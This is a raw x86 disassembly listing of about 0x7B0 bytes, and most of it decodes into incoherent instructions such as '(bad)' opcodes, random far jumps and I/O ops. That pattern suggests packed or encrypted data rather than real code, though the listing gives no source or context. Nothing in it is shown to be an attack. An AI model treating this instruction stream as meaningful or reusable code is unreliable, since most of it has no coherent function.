  409219:	sub    BYTE PTR [ebx+eax*2-0x147d314b],ah
  409220:	mov    esi,0x99edb0e3
  409225:	fucomi st,st(1)
  409227:	xchg   ebx,eax
  409228:	adc    eax,0x8f8aeef0
  40922d:	sti    
  40922e:	inc    ebx
  40922f:	mov    esi,0x3222da6e
  409234:	(bad)  
  409235:	aaa    
  409236:	(bad)  
  409238:	pop    ss
  409239:	fs inc esp
  40923b:	pusha  
  40923c:	jge    0x409282
  40923e:	(bad)  
  40923f:	shl    BYTE PTR [edx-0x19],1
  409242:	jmp    0x789f:0xdaaaa8b7
  409249:	mov    edi,cs
  40924b:	ror    DWORD PTR [ebx-0x19b074a7],0x3e
  409252:	push   ss
  409253:	dec    edi
  409254:	fist   DWORD PTR [esi]
  409256:	outs   dx,BYTE PTR ds:[esi]
  409257:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409258:	rcr    ah,1
  40925a:	mov    ch,0x69
  40925c:	cli    
  40925d:	loopne 0x409277
  40925f:	cli    
  409260:	or     eax,DWORD PTR [esi+0x5e208f27]
  409266:	aad    0xff
  409268:	push   ss
  409269:	stos   BYTE PTR es:[edi],al
  40926a:	and    DWORD PTR [edi-0x628f5f31],ebp
  409270:	in     eax,dx
  409271:	jecxz  0x409295
  409273:	xchg   ecx,eax
  409274:	fcmovbe st,st(4)
  409276:	adc    DWORD PTR ds:0x258b067d,0x873ee6fd
  409280:	push   ss
  409281:	jmp    0x409210
  409283:	in     al,0x8f
  409285:	ja     0x40920c
  409287:	ins    BYTE PTR es:[edi],dx
  409288:	mov    DWORD PTR [edi+0x2fa2b673],ebx
  40928e:	jns    0x409229
  409290:	enter  0xf161,0x32
  409294:	lods   eax,DWORD PTR ds:[esi]
  409295:	sub    ebp,DWORD PTR [edi+0x23]
  409298:	and    ebp,DWORD PTR [edx]
  40929a:	in     eax,dx
  40929b:	pop    ebx
  40929c:	sbb    DWORD PTR [ecx-0x4f],ebp
  40929f:	jg     0x409284
  4092a1:	imul   ebp,DWORD PTR [esi+0x51],0x24
  4092a5:	sbb    esi,DWORD PTR [eax]
  4092a7:	mov    al,0x97
  4092a9:	mov    ebp,DWORD PTR [ebx-0x40]
  4092ac:	dec    edi
  4092ad:	sub    al,0x70
  4092af:	call   0xe36:0xd3f0f1ba
  4092b6:	inc    ecx
  4092b7:	pop    ecx
  4092b8:	jb     0x40930e
  4092ba:	or     ecx,DWORD PTR [esi-0x66]
  4092bd:	fsubr  QWORD PTR [edi]
  4092bf:	in     al,0xb
  4092c1:	not    DWORD PTR [ecx-0x78009122]
  4092c7:	test   al,0x95
  4092c9:	and    eax,0xc6c02b8a
  4092ce:	out    dx,eax
  4092cf:	pop    ecx
  4092d0:	jecxz  0x40929b
  4092d2:	cmp    eax,esp
  4092d4:	mov    al,BYTE PTR [edi]
  4092d6:	lds    edi,FWORD PTR [edi+0x229f2072]
  4092dc:	jbe    0x409272
  4092de:	cwde   
  4092df:	mov    edx,0x88fa7ad1
  4092e4:	ja     0x409266
  4092e6:	sub    DWORD PTR [eax+0x6],eax
  4092e9:	or     eax,ebp
  4092eb:	ja     0x4092bb
  4092ed:	in     al,0x5e
  4092ef:	push   ecx
  4092f0:	cmp    BYTE PTR [ecx-0x38],dh
  4092f3:	or     DWORD PTR [edx+0xb],ebx
  4092f6:	cs retf 
  4092f8:	mov    es,WORD PTR [ecx]
  4092fa:	cmp    DWORD PTR [ebx-0x17995484],edi
  409300:	sti    
  409301:	push   DWORD PTR [eax]
  409303:	lea    eax,ds:0x41b260
  409309:	push   DWORD PTR [eax]
  40930b:	lea    eax,ds:0x41b344
  409311:	push   DWORD PTR [eax]
  409313:	xchg   ebx,edx
  409315:	inc    ebx
  409316:	inc    ebx
  409317:	sub    ebx,0x3
  40931a:	push   ebx
  40931b:	pop    eax
  40931c:	jmp    0x409669
  409321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409322:	jnp    0x409329
  409324:	or     DWORD PTR [ecx+0x52b3b211],esp
  40932a:	lahf   
  40932b:	jo     0x4092ae
  40932d:	ror    BYTE PTR [ecx-0x1dd8c92b],cl
  409333:	jo     0x4093a5
  409335:	and    BYTE PTR [ebp+0x70],bh
  409338:	jo     0x409366
  40933a:	mov    BYTE PTR [edx+0x6b],bl
  40933d:	jno    0x40935f
  40933f:	cdq    
  409340:	or     eax,DWORD PTR [edx-0x59d91efa]
  409346:	dec    esp
  409347:	fadd   DWORD PTR [esi+eiz*8+0x2ffcad3f]
  40934e:	aad    0x76
  409350:	bound  eax,QWORD PTR [ebp-0x67]
  409353:	xor    dl,BYTE PTR [edi-0x7c]
  409356:	sbb    al,0x92
  409359:	push   ebx
  40935a:	jb     0x40936e
  40935c:	pop    esi
  40935d:	mov    al,ds:0x2d55e9ea
  409362:	js     0x4093c3
  409364:	pop    ebp
  409365:	ror    BYTE PTR [edi+0x7aeb77f1],cl
  40936b:	cwde   
  40936c:	xlat   BYTE PTR ds:[ebx]
  40936d:	iret   
  40936e:	retf   0x2099
  409371:	ret    0x1ab
  409374:	stos   BYTE PTR es:[edi],al
  409375:	and    al,BYTE PTR [esi-0x47]
  409378:	out    0x2a,al
  40937a:	lock rep outs dx,BYTE PTR ds:[esi]
  40937d:	popf   
  40937e:	sub    DWORD PTR [esi],ebp
  409380:	sub    ecx,esi
  409382:	or     ch,BYTE PTR [esi]
  409384:	xor    bl,0xd2
  409387:	jmp    0xc1e4:0x62a8f329
  40938e:	fmulp  st(5),st
  409390:	push   esp
  409391:	jb     0x40938b
  409393:	test   BYTE PTR [ebp+0x470bdfcf],al
  409399:	push   edi
  40939a:	lahf   
  40939b:	xor    DWORD PTR [edx],edx
  40939d:	in     al,dx
  40939e:	stc    
  40939f:	bswap  edx
  4093a1:	hlt    
  4093a2:	aad    0x58
  4093a4:	in     eax,0x76
  4093a6:	into   
  4093a7:	xor    BYTE PTR [eax+ebp*1-0x5f],0x65
  4093ac:	jle    0x40937b
  4093ae:	rcl    BYTE PTR [eax],cl
  4093b0:	daa    
  4093b1:	mov    eax,0x649c8ca2
  4093b6:	icebp  
  4093b7:	stc    
  4093b8:	add    BYTE PTR [ebp+0x21],al
  4093bb:	cmp    DWORD PTR [ecx-0x5ff3621a],ecx
  4093c1:	and    DWORD PTR [ecx-0x7a743587],0xe8e681f
  4093cb:	test   eax,0xdadd5f67
  4093d0:	cli    
  4093d1:	call   0xd217a4e5
  4093d6:	and    DWORD PTR [edi-0x14b510eb],edx
  4093dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093dd:	dec    esi
  4093de:	mov    al,0x8c
  4093e0:	add    DWORD PTR [eax-0x54],eax
  4093e3:	jle    0x4093e6
  4093e5:	shl    BYTE PTR [esp+ecx*8+0x2d],cl
  4093e9:	jg     0x409411
  4093eb:	mov    ch,0x2d
  4093ed:	scas   al,BYTE PTR es:[edi]
  4093ee:	xor    ch,BYTE PTR [eax-0x30]
  4093f1:	pop    edx
  4093f2:	pop    ds
  4093f3:	and    BYTE PTR [edi],ch
  4093f5:	mov    ecx,0x120c4374
  4093fa:	popf   
  4093fb:	push   eax
  4093fc:	xchg   ecx,eax
  4093fd:	cmp    BYTE PTR [ebx-0x2ca48e8],0xff
  409404:	xor    ecx,DWORD PTR [edx+ecx*2-0x154979b3]
  40940b:	cmc    
  40940c:	pop    eax
  40940d:	pop    edi
  40940e:	imul   edi,DWORD PTR [ecx],0x17
  409411:	push   0x12
  409413:	inc    edi
  409414:	ins    BYTE PTR es:[edi],dx
  409415:	adc    edx,DWORD PTR [esi]
  409417:	clc    
  409418:	cdq    
  409419:	inc    ebx
  40941a:	pop    ebp
  40941c:	ficom  WORD PTR [ecx]
  40941e:	xor    eax,0x3030d8b2
  409423:	dec    ebx
  409424:	mov    WORD PTR [ebx+0x381a705b],cs
  40942a:	(bad)  
  40942c:	clc    
  40942d:	mov    ds:0xb46f1259,al
  409432:	retf   0xfe75
  409435:	add    al,0x9e
  409437:	push   eax
  409438:	scas   al,BYTE PTR es:[edi]
  409439:	lahf   
  40943a:	test   eax,0xdf1d7d8
  40943f:	leave  
  409440:	test   BYTE PTR [esi-0x5c],cl
  409443:	cmp    ebx,edi
  409445:	mov    bh,0x64
  409447:	jmp    FWORD PTR [ebx+0x9]
  40944a:	xchg   ebx,eax
  40944b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40944c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40944d:	sti    
  40944e:	xchg   ecx,eax
  40944f:	cmp    BYTE PTR [edi],dl
  409451:	lods   al,BYTE PTR ds:[esi]
  409452:	into   
  409453:	lods   eax,DWORD PTR ds:[esi]
  409454:	aam    0x56
  409456:	cmp    edx,DWORD PTR [esi-0x895f68d]
  40945c:	mov    edx,esi
  40945e:	enter  0x30bb,0x75
  409462:	pop    edi
  409463:	fimul  DWORD PTR [ecx-0x163ec332]
  409469:	out    0x23,al
  40946b:	sub    DWORD PTR [edi-0x199c4ed0],0x1d
  409472:	sbb    ah,cl
  409474:	xchg   edx,eax
  409475:	popf   
  409476:	add    bh,BYTE PTR [ecx+0x2a]
  409479:	and    cl,BYTE PTR [esp+esi*8+0x2639f9cd]
  409480:	fcomp  DWORD PTR [ecx+0x59]
  409483:	jns    0x40943e
  409485:	fcom   DWORD PTR [eax-0x6677d5fb]
  40948b:	mov    dl,BYTE PTR [ebx+0x77bbf69b]
  409491:	in     eax,dx
  409492:	cli    
  409493:	dec    ebx
  409494:	in     al,dx
  409495:	and    BYTE PTR [ebx+ebp*1-0x77f7a796],dl
  40949c:	mov    ds:0x46fc9498,eax
  4094a1:	push   cs
  4094a2:	xchg   ebx,eax
  4094a3:	nop
  4094a4:	sub    BYTE PTR ds:0x74d4601f,ch
  4094aa:	cli    
  4094ab:	sub    edx,esi
  4094ad:	jb     0x40944f
  4094af:	lds    eax,FWORD PTR [ecx]
  4094b1:	mov    ch,0x25
  4094b3:	fwait
  4094b4:	call   0x623d89cc
  4094b9:	rcr    cl,1
  4094bb:	cmp    cl,al
  4094bd:	adc    bl,BYTE PTR [edx]
  4094bf:	sub    al,0x2d
  4094c1:	dec    eax
  4094c2:	sbb    al,0xca
  4094c4:	out    0x27,eax
  4094c6:	popf   
  4094c7:	scas   al,BYTE PTR es:[edi]
  4094c8:	push   0x26f9794a
  4094cd:	out    dx,eax
  4094ce:	shl    BYTE PTR [ecx+0xb],0x9
  4094d2:	mov    dl,0x33
  4094d4:	int    0x29
  4094d6:	dec    esp
  4094d7:	mov    WORD PTR [edi],es
  4094d9:	iret   
  4094da:	pusha  
  4094db:	mov    al,0x64
  4094dd:	jle    0x40952e
  4094df:	xchg   ebx,eax
  4094e0:	pop    eax
  4094e1:	cmp    al,0xab
  4094e3:	pop    edi
  4094e4:	adc    DWORD PTR [ebx+edx*1],edi
  4094e7:	pop    es
  4094e8:	mov    cl,0x47
  4094ea:	jmp    0x6372:0xba4dcb3b
  4094f1:	xchg   ecx,eax
  4094f2:	(bad)  
  4094f3:	lock iret 
  4094f5:	mov    al,ds:0x3fb68832
  4094fa:	cmp    eax,esp
  4094fc:	pop    eax
  4094fd:	dec    esp
  4094fe:	les    eax,FWORD PTR [eax+0x3a5046a5]
  409504:	jg     0x4094b0
  409506:	sbb    eax,0x58ab786d
  40950b:	sahf   
  40950c:	fdivr  DWORD PTR [esi]
  40950e:	mov    ds:0x93f217cf,al
  409513:	push   ebp
  409514:	jge    0x409575
  409516:	mov    ecx,0x2e03d25b
  40951b:	pop    eax
  40951c:	mov    WORD PTR ds:[esi+eax*8],?
  409520:	adc    eax,0x7479672e
  409525:	cld    
  409526:	pop    edx
  409527:	mov    cl,0xbc
  409529:	add    BYTE PTR [edi-0x536af1b],dl
  40952f:	stos   DWORD PTR es:[edi],eax
  409530:	adc    bh,ch
  409532:	mov    dl,0x4
  409534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409535:	lods   eax,DWORD PTR ds:[esi]
  409536:	ficomp DWORD PTR [eax-0x10f6fc53]
  40953c:	mov    ebx,0x9cf1da9f
  409541:	(bad)  
  409542:	(bad)  [edi-0x8]
  409545:	ins    DWORD PTR es:[edi],dx
  409546:	mov    ecx,0xbd665278
  40954b:	mov    ds:0xc5e1f4c2,eax
  409550:	push   ss
  409551:	pop    DWORD PTR [edi+0x1a]
  409554:	sbb    al,0x1f
  409556:	call   0x7ded3fbb
  40955b:	shl    BYTE PTR [ecx-0x5],0xde
  40955f:	mov    ds:0xb79dc207,eax
  409564:	(bad)  
  409565:	std    
  409566:	adc    DWORD PTR [eax],edi
  409568:	adc    DWORD PTR [esi-0x51860145],edi
  40956e:	add    eax,DWORD PTR [ebp+0x58]
  409571:	mov    dl,0xd
  409573:	mov    bh,0xe9
  409575:	test   DWORD PTR [edi+0x149a4cae],edi
  40957b:	lods   eax,DWORD PTR ds:[esi]
  40957c:	scas   eax,DWORD PTR es:[edi]
  40957d:	or     al,0x6e
  40957f:	pushf  
  409580:	xchg   DWORD PTR [edi],ecx
  409582:	push   ebp
  409583:	jae    0x40955a
  409585:	enter  0x5ff9,0x21
  409589:	pushf  
  40958a:	nop
  40958b:	sbb    eax,0x7961bb40
  409590:	fnsave [ebp-0x24001c12]
  409596:	mov    esi,0x6c599f5f
  40959b:	cli    
  40959c:	stc    
  40959d:	loopne 0x409617
  40959f:	test   esp,ebx
  4095a1:	xchg   edi,eax
  4095a2:	sti    
  4095a3:	ins    BYTE PTR es:[edi],dx
  4095a4:	(bad)  
  4095a5:	adc    DWORD PTR [edi],edi
  4095a7:	icebp  
  4095a8:	xor    DWORD PTR [ebp+0x309736c5],0xfffffff3
  4095af:	push   ebx
  4095b0:	(bad)  
  4095b1:	jl     0x409568
  4095b3:	inc    eax
  4095b4:	hlt    
  4095b5:	xor    BYTE PTR [ebx-0x4f],ch
  4095b8:	mov    ebx,0x62fc270d
  4095bd:	(bad)  [eax]
  4095bf:	inc    ebp
  4095c0:	inc    eax
  4095c1:	in     al,0xfb
  4095c3:	add    DWORD PTR [edx],esi
  4095c5:	fnsave [ecx]
  4095c7:	push   ecx
  4095c8:	add    bl,BYTE PTR [ebp-0x29]
  4095cb:	popf   
  4095cc:	data16 mov dl,0x31
  4095cf:	lods   eax,DWORD PTR ds:[esi]
  4095d0:	data16 jecxz 0x409587
  4095d3:	fcmovne st,st(1)
  4095d5:	jnp    0x409607
  4095d7:	mov    esp,0xa583c963
  4095dc:	xchg   cl,dh
  4095de:	jae    0x4095ab
  4095e0:	loop   0x409615
  4095e2:	dec    ebp
  4095e3:	jecxz  0x409625
  4095e5:	jne    0x40959a
  4095e7:	ficom  DWORD PTR [eax+0x4e]
  4095ea:	(bad)  
  4095eb:	dec    edi
  4095ec:	jmp    0xf420:0x26760d66
  4095f3:	jnp    0x40962b
  4095f5:	sbb    eax,0x8313d919
  4095fa:	and    al,0x23
  4095fc:	jl     0x40962b
  4095fe:	scas   al,BYTE PTR es:[edi]
  4095ff:	sbb    bl,BYTE PTR [edi+ecx*1-0x769e1f2f]
  409606:	popf   
  409607:	adc    al,BYTE PTR [ebx-0x28a462be]
  40960d:	ficom  DWORD PTR [ebx]
  40960f:	push   es
  409610:	and    esp,DWORD PTR [ebp+0x4c]
  409613:	or     al,0xa2
  409615:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409616:	fs out 0x7c,eax
  409619:	pusha  
  40961a:	ja     0x40961c
  40961c:	imul   edi,DWORD PTR [esi-0x38e684e3],0x3ac1be23
  409626:	(bad)  
  409627:	push   esp
  409628:	aas    
  409629:	push   ecx
  40962a:	inc    ebp
  40962b:	enter  0x2293,0xa9
  40962f:	mov    eax,0xdfb108f3
  409634:	lock lods al,BYTE PTR ds:[esi]
  409636:	lock mov ch,0x6a
  409639:	mov    ds:0x951c383c,eax
  40963e:	shl    DWORD PTR [eax-0x142844],0x19
  409645:	sub    cl,ch
  409647:	xor    eax,0xf0de1f6b
  40964c:	fwait
  40964d:	inc    ebx
  40964e:	test   eax,0x270aec78
  409653:	mov    ebp,0x4e0e3eda
  409658:	inc    ebp
  409659:	jle    0x4096ac
  40965b:	sub    bl,BYTE PTR [ebx]
  40965d:	xchg   edi,eax
  40965e:	jo     0x4095ee
  409660:	pop    ds
  409661:	dec    edi
  409662:	add    dh,BYTE PTR [edi+0x38b80454]
  409668:	idiv   edi
  40966a:	push   eax
  40966b:	add    DWORD PTR [ebx+0xd8be045],ecx
  409671:	and    al,0xb2
  409673:	inc    ecx
  409674:	add    cl,ch
  409676:	dec    eax
  409677:	add    eax,DWORD PTR [eax]
  409679:	add    bh,ch
  40967b:	mov    ebx,0xd169d149
  409680:	ja     0x4096e3
  409682:	add    BYTE PTR [edi+0x44],bh
  409685:	xchg   eax,ebp
  409687:	ss dec esp
  409689:	sub    al,0xd7
  40968b:	out    dx,eax
  40968c:	jo     0x4096fe
  40968e:	and    BYTE PTR [ebp+0x70],bh
  409691:	jo     0x40962b
  409693:	push   cs
  409694:	inc    esi
  409695:	leave  
  409696:	icebp  
  409697:	jp     0x40967e
  409699:	mov    al,0xe5
  40969b:	inc    eax
  40969c:	lahf   
  40969d:	ja     0x409702
  40969f:	push   edx
  4096a0:	mov    bh,bl
  4096a2:	mov    ah,0xa6
  4096a4:	xchg   bx,ax
  4096a6:	clc    
  4096a7:	ret    
  4096a8:	sub    eax,0xd0c4c5bd
  4096ad:	xchg   esp,eax
  4096ae:	jmp    0x6400e863
  4096b3:	call   FWORD PTR [edx]
  4096b5:	cwde   
  4096b6:	mov    DWORD PTR [edx-0x49],esp
  4096b9:	fist   DWORD PTR ss:[ebx]
  4096bc:	retf   
  4096bd:	pushf  
  4096be:	ss cdq 
  4096c0:	cmp    cl,BYTE PTR [ecx+eax*8]
  4096c3:	and    BYTE PTR [edi+edi*2+0x76145ce9],bl
  4096ca:	adc    BYTE PTR [esi+0x61],bl
  4096cd:	sbb    BYTE PTR [edi-0x67],bl
  4096d0:	and    al,0xf
  4096d2:	or     edx,DWORD PTR [ecx+edx*4+0x1e179877]
  4096d9:	fldenv [ebx]
  4096db:	(bad)  
  4096dc:	nop
  4096dd:	test   DWORD PTR [ebx+0x26d16d93],eax
  4096e3:	pusha  
  4096e4:	xor    DWORD PTR [eax+0x6d],esp
  4096e7:	pusha  
  4096e8:	loopne 0x4096de
  4096ea:	pop    edi
  4096eb:	inc    ebp
  4096ec:	ret    0x15ec
  4096ef:	pop    esp
  4096f0:	pop    esp
  4096f1:	adc    ebp,ecx
  4096f3:	cmc    
  4096f4:	jg     0x40974c
  4096f6:	push   cs
  4096f7:	or     al,0x42
  4096f9:	push   edi
  4096fa:	and    DWORD PTR [eax+0x3a],0x1d
  4096fe:	sbb    BYTE PTR [edx+0x25659964],ch
  409704:	fstp   TBYTE PTR [ecx]
  409706:	inc    ebp
  409707:	mov    ebp,0xc704a7bd
  40970c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40970d:	xchg   ecx,eax
  40970e:	pop    ds
  40970f:	fistp  DWORD PTR [eax-0x23]
  409712:	fsub   QWORD PTR [edx]
  409714:	fdivrp st(7),st
  409716:	imul   DWORD PTR [esi+0x4b72c4b4]
  40971c:	pushf  
  40971d:	add    DWORD PTR [edx],ebx
  40971f:	ficomp DWORD PTR [esi-0x1d7b3eb6]
  409725:	enter  0xc9a7,0x22
  409729:	cdq    
  40972a:	je     0x409742
  40972c:	cmp    BYTE PTR [ecx],al
  40972e:	shl    BYTE PTR [ebp+0xb773ad6],0x81
  409735:	push   ebp
  409736:	inc    ebp
  409737:	xchg   ebx,eax
  409738:	and    BYTE PTR [edx],bh
  40973a:	adc    eax,0x4375923f
  40973f:	fistp  WORD PTR [edx]
  409741:	inc    edx
  409742:	mov    dl,dl
  409744:	mov    al,0x5f
  409746:	call   0xbe2:0x9382156e
  40974d:	aas    
  40974e:	pusha  
  40974f:	add    BYTE PTR [edx-0x55],bh
  409752:	nop
  409753:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409754:	sub    eax,0xc9459fdc
  409759:	(bad)  
  40975a:	stc    
  40975b:	ins    BYTE PTR es:[edi],dx
  40975c:	jp     0x40975f
  40975e:	fld    st(0)
  409760:	pop    es
  409761:	mov    ebp,0xb152de52
  409766:	or     al,0x32
  409768:	mov    ds:0x48175540,eax
  40976d:	test   DWORD PTR [eax+0x1d],eax
  409770:	jnp    0x40973d
  409772:	fisub  WORD PTR [esi]
  409774:	dec    edi
  409775:	dec    eax
  409776:	imul   DWORD PTR [edx+esi*2]
  409779:	mov    al,0x98
  40977b:	push   0x50
  40977d:	fwait
  40977e:	push   es
  40977f:	mov    ebx,0xc7ad3bd0
  409784:	mov    al,ds:0xdbefef0c
  409789:	push   ebx
  40978a:	push   es
  40978b:	mov    esi,0x80de574b
  409790:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409791:	addr16 jmp 0xc7a3dc32
  409797:	jmp    0x56cd:0x81e65c83
  40979e:	xchg   edi,eax
  40979f:	retf   0x792
  4097a2:	jns    0x40979d
  4097a4:	cwde   
  4097a5:	sahf   
  4097a6:	push   ebp
  4097a7:	(bad)
  4097aa:	(bad)  
  4097ab:	daa    
  4097ac:	arpl   WORD PTR [ebx],di
  4097ae:	xor    BYTE PTR [ecx],0xb3
  4097b1:	mov    dl,0x60
  4097b3:	rcl    BYTE PTR [edi+ecx*1-0x2b562b01],cl
  4097ba:	inc    ecx
  4097bb:	push   edi
  4097bc:	mov    al,ds:0xdc11f499
  4097c1:	leave  
  4097c2:	ins    BYTE PTR es:[edi],dx
  4097c3:	cs scas al,BYTE PTR es:[edi]
  4097c5:	popa   
  4097c6:	(bad)  
  4097c7:	mov    ds:0xc1a9b8cd,eax
  4097cc:	mov    edx,0x6353da34
  4097d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097d2:	int    0xc1
  4097d4:	cdq    
  4097d5:	mov    ecx,0xf2c65ad6
  4097da:	and    BYTE PTR [edi+0x59],ch
  4097dd:	call   0x5aaa:0xba7a0659
  4097e4:	inc    esp
  4097e5:	sub    edx,DWORD PTR [ebx-0xe]
  4097e8:	fcom   DWORD PTR [ecx-0x55713e6d]
  4097ee:	push   cs
  4097ef:	pusha  
  4097f0:	enter  0xa6fa,0xfc
  4097f4:	sbb    eax,0x9286dc9d
  4097f9:	cmp    dh,BYTE PTR [ecx-0x4fe4a178]
  4097ff:	pop    eax
  409800:	or     bl,ch
  409802:	cli    
  409803:	cmp    eax,DWORD PTR [ebx-0x26]
  409806:	adc    esp,DWORD PTR [ecx+0x42]
  409809:	inc    edi
  40980a:	aad    0x45
  40980c:	(bad)
  409810:	aad    0x1e
  409812:	dec    ecx
  409813:	push   0x7c5b59e4
  409818:	jae    0x4097c0
  40981a:	and    esi,DWORD PTR [edx]
  40981c:	jecxz  0x409881
  40981e:	pop    edx
  40981f:	mov    dh,0x9d
  409821:	fist   DWORD PTR [eax*1+0x310780b8]
  409828:	pop    esp
  409829:	jecxz  0x409856
  40982b:	dec    edi
  40982c:	(bad)  
  40982d:	repz stc 
  40982f:	ins    DWORD PTR es:[edi],dx
  409830:	mov    bh,0xa0
  409832:	jl     0x409884
  409834:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409835:	and    BYTE PTR [esi+0x76],0xf7
  409839:	popa   
  40983a:	inc    ecx
  40983b:	pop    esp
  40983c:	jnp    0x40986a
  40983e:	cs pop ebx
  409840:	mov    WORD PTR [edx],?
  409842:	in     eax,dx
  409843:	mov    ch,0xc
  409845:	cld    
  409846:	push   DWORD PTR [ecx+0x4f550853]
  40984c:	(bad)  
  40984d:	push   esp
  40984e:	mov    edi,0xeef87907
  409853:	adc    eax,0x7d22acea
  409858:	ret    
  409859:	or     al,0x9f
  40985b:	and    ecx,DWORD PTR ds:0xecf2da24
  409861:	call   0xa06ab1b2
  409866:	xlat   BYTE PTR ds:[ebx]
  409867:	jecxz  0x4098aa
  409869:	push   ebx
  40986a:	jne    0x4098d8
  40986c:	sbb    dl,al
  40986e:	rol    BYTE PTR [ecx],cl
  409870:	and    edx,DWORD PTR [ecx-0x3d]
  409873:	cs mul bl
  409876:	mov    ebp,0x954c437e
  40987b:	jmp    0x4098be
  40987d:	mov    bh,0x72
  40987f:	mov    eax,0xb7567eff
  409884:	mov    WORD PTR ds:0xc18c744e,?
  40988a:	add    DWORD PTR ds:0xf46d6041,esp
  409890:	mov    ds:0xc0574d68,eax
  409895:	pop    ebp
  409896:	push   ebx
  409897:	aaa    
  409898:	in     al,dx
  409899:	push   0xe6db1d02
  40989e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40989f:	pop    ss
  4098a0:	ret    
  4098a1:	adc    dh,dh
  4098a3:	dec    eax
  4098a4:	fdivr  st,st(3)
  4098a6:	sahf   
  4098a7:	push   ebp
  4098a8:	aas    
  4098a9:	arpl   WORD PTR [ebx],si
  4098ab:	mov    eax,ds:0x74d49717
  4098b0:	dec    ecx
  4098b1:	aaa    
  4098b2:	les    ebx,FWORD PTR [ebx+0xe]
  4098b5:	fcom   QWORD PTR [esi]
  4098b7:	(bad)  
  4098b8:	fdivr  st,st(4)
  4098ba:	das    
  4098bb:	addr16 cmp ah,0xe4
  4098bf:	popa   
  4098c0:	sbb    dl,BYTE PTR fs:[ebx+0x15497f0e]
  4098c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098c8:	out    0xe5,eax
  4098ca:	sbb    DWORD PTR [ebx],ecx
  4098cc:	retf   
  4098cd:	sti    
  4098ce:	int    0x5f
  4098d0:	rcr    edx,1
  4098d2:	outs   dx,DWORD PTR ds:[esi]
  4098d3:	xchg   edx,eax
  4098d4:	mov    ?,WORD PTR [ebx]
  4098d6:	loope  0x40989d
  4098d8:	push   ecx
  4098d9:	push   ds
  4098da:	push   ebx
  4098db:	push   esi
  4098dc:	xchg   ebx,eax
  4098dd:	lea    ecx,[edi*1+0x30dee7bb]
  4098e4:	ror    DWORD PTR [eax+0x58],cl
  4098e7:	add    eax,0x1644b86d
  4098ec:	gs and ax,0x5b8b
  4098f1:	sub    al,0x44
  4098f3:	jo     0x4098ab
  4098f5:	lds    esi,FWORD PTR [eax]
  4098f7:	or     BYTE PTR [ebx-0x331b1bc8],0x7b
  4098fe:	lds    eax,FWORD PTR [esp+eax*8]
  409901:	jnp    0x409950
  409903:	and    ebx,DWORD PTR [ebx]
  409905:	mov    edi,0x6843fe9e
  40990a:	outs   dx,DWORD PTR ds:[esi]
  40990b:	sub    al,0x4c
  40990d:	in     al,dx
  40990e:	cs xchg esi,eax
  409910:	shr    BYTE PTR [edx*1+0x6bfb30a],0x5
  409918:	popa   
  409919:	or     ebp,DWORD PTR [esi]
  40991b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40991c:	aam    0x48
  40991e:	add    bh,ch
  409920:	inc    edx
  409921:	bound  eax,QWORD PTR [edx+0x41627c52]
  409927:	dec    DWORD PTR [esi]
  409929:	stos   BYTE PTR es:[edi],al
  40992a:	sub    bl,bl
  40992c:	cmp    eax,DWORD PTR [eax+0x31]
  40992f:	out    dx,eax
  409930:	inc    ecx
  409931:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409932:	idiv   edx
  409934:	jb     0x409908
  409936:	sar    eax,1
  409938:	cmp    al,0xeb
  40993a:	jg     0x4098de
  40993c:	pushf  
  40993d:	xchg   ebp,eax
  40993e:	xchg   ebx,eax
  40993f:	mov    bh,0xc2
  409941:	lea    ebp,[edx+0x79b1363]
  409947:	les    ebx,FWORD PTR [edi+0x36]
  40994a:	lea    ebp,[ebp-0x3c]
  40994d:	ins    DWORD PTR es:[edi],dx
  40994e:	int3   
  40994f:	leave  
  409950:	repnz outs dx,BYTE PTR ds:[esi]
  409952:	xchg   esp,eax
  409953:	xchg   edx,eax
  409954:	das    
  409955:	loop   0x4099c1
  409957:	pop    esp
  409958:	add    al,0xe3
  40995a:	sar    BYTE PTR [edi],1
  40995c:	test   dl,bl
  40995e:	mov    eax,ds:0xaaed6fe1
  409963:	imul   esi,ebx,0x61a54cf3
  409969:	xlat   BYTE PTR ds:[ebx]
  40996a:	jb     0x409919
  40996c:	cli    
  40996d:	push   ebp
  40996e:	(bad)  
  40996f:	mov    eax,DWORD PTR [edi-0x27]
  409972:	mov    bl,0x17
  409974:	call   0x3522:0xc08d8073
  40997b:	iret   
  40997c:	aas    
  40997d:	sub    bl,BYTE PTR [ecx]
  40997f:	jp     0x409930
  409981:	adc    BYTE PTR [ebp+0x3e],ch
  409984:	jp     0x4099ba
  409986:	sub    BYTE PTR ds:0x9edf354,0x5
  40998d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40998e:	nop
  40998f:	mov    DWORD PTR [ecx+0x3d1459ba],ebx
  409995:	push   ebx
  409996:	in     eax,dx
  409997:	xchg   esi,eax
  409998:	scas   al,BYTE PTR es:[edi]
  409999:	(bad)  
  40999a:	push   esi
  40999b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40999c:	dec    ebx
  40999d:	gs sbb esi,eax
  4099a0:	pop    es
  4099a1:	call   0xe271:0x17af2dfe
  4099a8:	arpl   WORD PTR [ebp+eiz*8+0x47],si
  4099ac:	mov    ds:0x415dd291,eax
  4099b1:	retf   0x9824
  4099b4:	ja     0x4099f1
  4099b6:	sbb    BYTE PTR [ecx-0x2ecfe10e],0x17
  4099bd:	mov    bl,0x95
  4099bf:	rcl    bl,0xef
  4099c2:	add    DWORD PTR [eax],ecx
  4099c4:	pop    edi
  4099c5:	pop    esi
  4099c6:	pop    ebx
  4099c7:	leave  
  4099c8:	ret    
  4099c9:	push   ebp
  4099ca:	mov    ebp,esp
